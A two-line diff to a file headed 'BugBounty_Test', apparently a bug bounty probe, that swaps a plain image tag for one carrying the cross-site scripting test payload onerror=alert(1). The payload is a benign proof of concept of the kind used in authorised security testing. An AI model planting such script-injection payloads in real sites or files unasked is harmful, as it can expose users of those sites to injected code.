@@ -1,2 +1,2 @@
 # BugBounty_Test
-<img src="x" />
+<img src="x" onerror=alert(1) />
